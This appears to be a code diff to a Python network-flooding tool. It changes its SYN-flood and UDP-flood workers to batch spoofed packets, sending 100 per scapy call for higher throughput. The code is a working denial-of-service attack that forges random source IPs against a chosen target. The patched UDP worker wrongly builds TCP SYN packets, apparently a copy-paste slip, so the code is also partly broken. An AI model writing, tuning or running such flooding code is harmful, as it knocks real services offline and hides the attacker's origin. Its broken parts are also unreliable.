@@ -7,7 +7,7 @@ import time
 from typing import Dict, Tuple
 
 try:
-    from scapy.all import IP, TCP, UDP, send
+    from scapy.all import IP, TCP, UDP, send, conf
     SCAPY_OK = True
 except ImportError:
     SCAPY_OK = False
@@ -46,20 +46,31 @@ class SynFlood:
         return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
     def _worker(self) -> None:
+        lot: list = []
         while self._running:
+            lot.append(IP(src=self._random_ip(), dst=self.target_ip) / TCP(
+                sport=random.randint(1024, 65535),
+                dport=self.target_port,
+                flags="S",
+                seq=random.randint(0, 0xFFFFFFFF),
+            ))
+            if len(lot) >= 100:  # 1 seul appel Npcap pour 100 paquets
+                try:
+                    send(lot, verbose=False)
+                    with self._lock:
+                        self._sent += len(lot)
+                except Exception:
+                    with self._lock:
+                        self._errors += len(lot)
+                lot = []
+        if lot:  # résidu après arrêt
             try:
-                pkt = IP(src=self._random_ip(), dst=self.target_ip) / TCP(
-                    sport=random.randint(1024, 65535),
-                    dport=self.target_port,
-                    flags="S",
-                    seq=random.randint(0, 0xFFFFFFFF),
-                )
-                send(pkt, verbose=False)
+                send(lot, verbose=False)
                 with self._lock:
-                    self._sent += 1
+                    self._sent += len(lot)
             except Exception:
                 with self._lock:
-                    self._errors += 1
+                    self._errors += len(lot)
 
     def run(self) -> Dict:
         if not SCAPY_OK:
@@ -118,19 +129,31 @@ class UdpFlood:
         return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
     def _worker(self) -> None:
-        payload = bytes(random.getrandbits(8) for _ in range(self.payload_size))
+        lot: list = []
         while self._running:
+            lot.append(IP(src=self._random_ip(), dst=self.target_ip) / TCP(
+                sport=random.randint(1024, 65535),
+                dport=self.target_port,
+                flags="S",
+                seq=random.randint(0, 0xFFFFFFFF),
+            ))
+            if len(lot) >= 100:  # 1 seul appel Npcap pour 100 paquets
+                try:
+                    send(lot, verbose=False)
+                    with self._lock:
+                        self._sent += len(lot)
+                except Exception:
+                    with self._lock:
+                        self._errors += len(lot)
+                lot = []
+        if lot:  # résidu après l'arrêt
             try:
-                pkt = IP(src=self._random_ip(), dst=self.target_ip) / UDP(
-                    sport=random.randint(1024, 65535),
-                    dport=self.target_port,
-                ) / payload
-                send(pkt, verbose=False)
+                send(lot, verbose=False)
                 with self._lock:
-                    self._sent += 1
+                    self._sent += len(lot)
             except Exception:
                 with self._lock:
-                    self._errors += 1
+                    self._errors += len(lot)
 
     def run(self) -> Dict:
         if not SCAPY_OK:
